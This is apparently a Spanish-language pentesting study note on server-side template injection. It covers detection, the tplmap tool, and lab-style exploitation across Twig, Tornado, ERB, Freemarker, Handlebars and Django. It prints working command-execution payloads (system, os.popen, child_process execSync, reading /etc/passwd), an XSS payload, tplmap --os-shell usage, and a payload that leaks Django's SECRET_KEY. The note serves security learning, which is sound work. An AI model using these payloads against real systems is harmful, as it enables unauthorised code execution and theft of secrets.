# Server Side Template Injection (SSTI)

## Table of contents

- [Server Side Template Injection (SSTI)](#server-side-template-injection-ssti)
  - [INTRODUCCION](#introduccion)
  - [IDENTIFICACION](#identificacion)
    - [MANUAL](#manual)
    - [AUTOMATIZADA](#automatizada)
    - [METODOLOGIA](#metodologia)
  - [tplmap](#tplmap)
    - [INSTALACION](#instalacion)
    - [USO](#uso)
  - [EXPLOTACION](#explotacion)
    - [TWIG](#twig)
    - [TORNADO](#tornado)
    - [ERB RUBY](#erb-ruby)
    - [Basic server-side template injection (code context)](#basic-server-side-template-injection-code-context)
    - [SSTI Freemarker](#ssti-freemarker)
    - [SSTI HANDLEBARS](#ssti-handlebars)
    - [SSTI DJANGO](#ssti-django)

## INTRODUCCION

Los motores de plantilla leen cadenas tokenizadas de documentos de plantilla y producen cadenas representadas con valores reales en el documento de salida. Los desarrolladores web suelen utilizar plantillas como formato intermedio para crear contenido dinámico de sitios web. La inyección de plantilla del lado del servidor (`SSTI`) consiste esencialmente en inyectar directivas de plantilla maliciosas dentro de una plantilla, aprovechando los motores de plantilla que mezclan de manera insegura la entrada del usuario con una plantilla determinada.

Para entender mejor podemos ver el siguiente ejemplo de codigo backend:

```python
#/usr/bin/python3
from flask import *

app = Flask(__name__, template_folder="./")

@app.route("/")
def index():
	title = "Index Page"
	content = "Some content"
	return render_template("index.html", title=title, content=content)

@app.route("/hello", methods=['GET'])
def hello():
	name = request.args.get("name")
	if name == None:
		return redirect(f'{url_for("hello")}?name=guest')
	htmldoc = f"""
	<html>
	<body>
	<h1>Hello</h1>
	<a>Nice to see you {name}</a>
	</body>
	</html>
	"""
	return render_template_string(htmldoc)

if __name__ == "__main__":
	app.run(host="127.0.0.1", port=5000)
```

El parametro **name** pasado por GET no esta siendo sanitizada ni validada por lo que es vulnerable a SSTI.

```bash
curl -gis 'http://127.0.0.1:5000/hello?name={{7*7}}'

#output
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 79
Server: Werkzeug/2.0.2 Python/3.9.7
Date: Mon, 25 Oct 2021 00:12:40 GMT


	<html>
	<body>
	<h1>Hello</h1>
	<a>Nice to see you 49</a> # <-- Expresion evaluated
	</body>
	</html>
```

## IDENTIFICACION

### MANUAL

Podemos detectar vulnerabilidades de SSTI inyectando diferentes etiquetas en las entradas que controlamos para ver si se evalúan en la respuesta. No necesariamente necesitamos ver los datos inyectados reflejados en la respuesta que recibimos. A veces solo se evalúa en diferentes páginas (a ciegas).

La forma más fácil de detectar inyecciones es proporcionar expresiones matemáticas entre llaves, por ejemplo:

```html
{7*7}
${7*7}
#{7*7}
%{7*7}
{{7*7}}
```

En la mayoría de los casos, esta carga útil políglota activará un error en presencia de una vulnerabilidad SSTI:

```html
${{<%[%'"}}%\.
```

>[!tip]
>Simplemente enviar una sintaxis no válida suele ser suficiente porque el mensaje de error resultante le dirá exactamente cuál es el motor de plantilla y, a veces, incluso qué versión.

estos payloads me funcionan para generar errores:

```bash
${$}
${{$}}
{$}
{{$}}
```

para obtener mas payloads podemos consultar los siguientes enlaces:

- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)
- [HackTricks](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)

En otros casos, la vulnerabilidad queda expuesta cuando la entrada del usuario se coloca dentro de una expresión de plantilla:

```java
greeting = getQueryParameter('greeting')
engine.render("Hello {{"+greeting+"}}", data)
```

En el sitio web, la URL resultante sería algo como:

```bash
http://vulnerable-website.com/?greeting=data.username
```

El siguiente paso es intentar salir de la declaración utilizando la sintaxis de plantillas común e intentar inyectar HTML arbitrario después:

```bash
http://vulnerable-website.com/?greeting=data.username}}<tag>
```

### AUTOMATIZADA

#### TPLMAP

La forma más difícil de identificar SSTI es fuzzear la plantilla mediante la inyección de combinaciones de caracteres especiales utilizados en las expresiones de la plantilla.

Podemos usar herramientas como [Tplmap](https://github.com/epinna/tplmap) o J2EE Scan (Burp Pro) para probar automáticamente las vulnerabilidades de SSTI o crear una lista de carga útil para usar con Burp Intruder o ZAP.

ejemplo:

```bash
python2.7 ./tplmap.py -u 'http://www.target.com/page?name=John*' --os-shell

python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomment&link"

python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
```

#### SSTI SCANNER

- [https://www.youtube.com/watch?v=SV0uaJcAJ8M](https://www.youtube.com/watch?v=SV0uaJcAJ8M)
- [https://www.youtube.com/watch?v=SV0uaJcAJ8M](https://www.youtube.com/watch?v=SV0uaJcAJ8M)

```bash
#GET
python3 ssti.py -u --get 1

#POST
python3 ssti.py -p --post 1 -p param1,param2

#SCAN LIST OF URLS
python3 ssti.py -f .txt
```

Podemos agregar cargas útiles personalizadas en esta herramienta. Simplemente abra el archivo "**payload.json**" y agregue su payload como: **{ "payload":"${7*7}", "output":"49" }**

### METODOLOGIA

El siguiente diagrama de [PortsSwigger](https://portswigger.net/research/server-side-template-injection) puede ayudarnos a identificar si estamos lidiando con una vulnerabilidad SSTI y también identificar el motor de plantilla subyacente.

![[Pasted image 20230111145732.png]]

Además del diagrama anterior, podemos probar los siguientes enfoques para reconocer la tecnología con la que estamos tratando:

- Compruebe los errores detallados de los nombres de tecnología. A veces, simplemente copiar el error en la búsqueda de Google puede proporcionarnos una respuesta directa con respecto a la tecnología subyacente utilizada.
- Consulte por extensiones. Por ejemplo, las extensiones .jsp están asociadas con Java. Cuando se trata de Java, es posible que nos enfrentemos a una vulnerabilidad de inyección de lenguaje de expresión/OGNL en lugar de SSTI tradicional
- Envíe expresiones con corchetes sin cerrar para ver si se generan errores detallados. No intente este enfoque en los sistemas de producción, ya que puede bloquear el servidor web.

**ES IMPORTANTE IDENTIFICAR LA PLANTILLA YA QUE HAY MUCHOS PAYLOADS SEGUN LA PLANTILLA QUE SE USE, NO VALE LA PENA FUZZEAR TODOSL OS PAYLOADS PORQUE PUEDEN SER DETECTADOS, SIEMPRE COMO PRIMERA OPCION ES MEJOR IDENTIFICAR ANTE QUE PLANTILLA NOS ENFRENTAMOS**

## tplmap

### INSTALACION

```bash
git clone https://github.com/epinna/tplmap.git
cd tplmap
pip install -r requirements.txt
```

>[!note]
>tplmap usa python 3.9.* o inferior, por lo que si tienes python 10 puedes jugar con virtual enviroment. [pyenv](https://medium.datadriveninvestor.com/how-to-install-and-manage-multiple-python-versions-on-linux-916990dabe4b)

### USO

```bash
#peticion POST
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john

#peticion GET
./tplmap.py -u 'http://www.target.com/page?name=John'

#en caso de encontrar un SSTI exitoso podemos intentar obtener un RCE
./tplmap.py -u 'http://<TARGET IP>:<PORT>' -d name=john --os-shell
```

esto puede ayudarnos a descubrir el tipo de plantilla utilizado:

![[Pasted image 20230210072053.png]]

## EXPLOTACION

### TWIG

De estar seguros de que se esta usando una plantilla TWIG, podemos hacer lo siguiente.

El siguiente paso es lograr la ejecución remota de código en el servidor de destino. Antes de pasar a la parte de la carga útil, se debe mencionar que Twig tiene la variable `_self` que, en términos simples, hace públicas algunas de las API internas. Este objeto `_self` se ha documentado, por lo que no es necesario aplicar fuerza bruta a ningún nombre de variable (más sobre esto en los siguientes ejemplos de explotación de SSTI). Volviendo a la parte de ejecución remota de código, podemos usar la función `getFilter` ya que permite la ejecución de una función definida por el usuario a través del siguiente proceso:

-   Registre una función como devolución de llamada de filtro a través de`registerUndefinedFilterCallback`
    
-   Invocar `_self.env.getFilter()` para ejecutar la función que acabamos de registrar

```php
{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id;uname -a;hostname")}}
```

>[!tip]
>cuando notamos que se evalúan las expresiones matemáticas que enviamos, la aplicación también puede ser vulnerable a XSS.
>```bash
>{{<svg/onload=confirm()>}}>
>```

### TORNADO

Podemos validar este motor de plantillas con **Tplmap** o a veces se muestra en el header **Server** de la respuesta:

![[Pasted image 20230111221022.png]]

De encontrar esto, podemos ejecutar comandos de la siguiente manera:

```bash
{%import os%}{{os.popen('id').read()}}
```

Los espacios lo ponemos en URL Encoded:

![[Pasted image 20230111221213.png]]

### ERB RUBY

PoC:

```bash
<%= 7 * 7 %>
```

![[Pasted image 20230211070941.png]]

ejecucion remoet de comandos:

```bash
<%= system('cat /etc/passwd') %>
```

![[Pasted image 20230211071103.png]]


### Basic server-side template injection (code context)

Una pagina puede tener la funcionalidad de como mostrar tu nombre cuando comentas en un post:

![[Pasted image 20230211072621.png]]

al interceptarlo con burpsuite vemos que viaja asi:

![[Pasted image 20230211072843.png]]

>[!tip]
>El que viaje asi parece que lo maneja como atributo de un objeto: `objecto.atributo`.

al ser un objeto puede que se este implementando en el codigo asi:

```html
<section class="comment">
	<p>
		<img src="/resources/images/avatarDefault.svg" class="avatar">
		{{user.name}} | {{comment.date}}
	</p>
	<p>
		{{comment.body}}
	</p>
</section>
```

este valor es reflejado al comentar un post:

![[Pasted image 20230211074027.png]]

si no enviamos nada o un objeto que no existe generaremos un error:

![[Pasted image 20230211074215.png]]

![[Pasted image 20230211074239.png]]

pudimos descubrir que el motor de plantilla es tornado, entonces podemos crear el siguiente payload:

```bash
user.name}}{{7*7}}
```

reemplazando en el codigo quedara asi:

```html
<section class="comment">
	<p>
		<img src="/resources/images/avatarDefault.svg" class="avatar">
		{{user.name}}{{7*7}} | {{comment.date}}
	</p>
	<p>
		{{comment.body}}
	</p>
</section>
```

![[Pasted image 20230211074437.png]]

![[Pasted image 20230211074456.png]]

vemos que funciona, podemos ejecutar comandos:

```bash
user.name}}{%import os%}{{os.popen('id').read()}}
```

![[Pasted image 20230211074639.png]]

### SSTI Freemarker

Una pagina nos permite editar un template usando la sintxis de su plantilla:

![[Pasted image 20230211162607.png]]

para determinar que plantilla esta usando debemos generar un error y que nos muestre algo de informacion, la idea es probar los caracteres especiales como variables, este funciono:

```bash
${$}
```

![[Pasted image 20230211162816.png]]

con esto ya podemos buscar un payload para dicha plantilla:

```bash
${"freemarker.template.utility.Execute"?new()("id")}
```

![[Pasted image 20230211163002.png]]

### SSTI HANDLEBARS

Encontramos un parametro controlable por el usuario y que se refleja en la pagina:

![[Pasted image 20230211164849.png]]

vamos a intentar colocar varios payloads PoC de SSTI para encontrar opciones, el siguiente payload nos mostro un error:

```bash
${{7*7}}
```

![[Pasted image 20230211165123.png]]

el motor utilizado es **handlebars**, podemos ejecutar comandos con el siguiente payload:

```javascript
//urlencoded
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

![[Pasted image 20230211170334.png]]

### SSTI DJANGO

Una pagina nos permite editar un template usando la sintxis de su plantilla:

![[Pasted image 20230211172025.png]]

vamos intentar generar un error para conocer el motor de plantilla:

```bash
{{$}}
```

![[Pasted image 20230211172239.png]]

Se esta usando **django** como framework y su motor de plantilla, muchos de los payloads de **jinja2** pueden servir porque es igual basado en python, algo que podemos hacer es obtener la clave secreta de la configuracion de **Django**:

```bash
{{settings.SECRET_KEY}}
```

![[Pasted image 20230211172651.png]]

>[!note]
>En SSTI en Django un RCE no es posible por ahora.

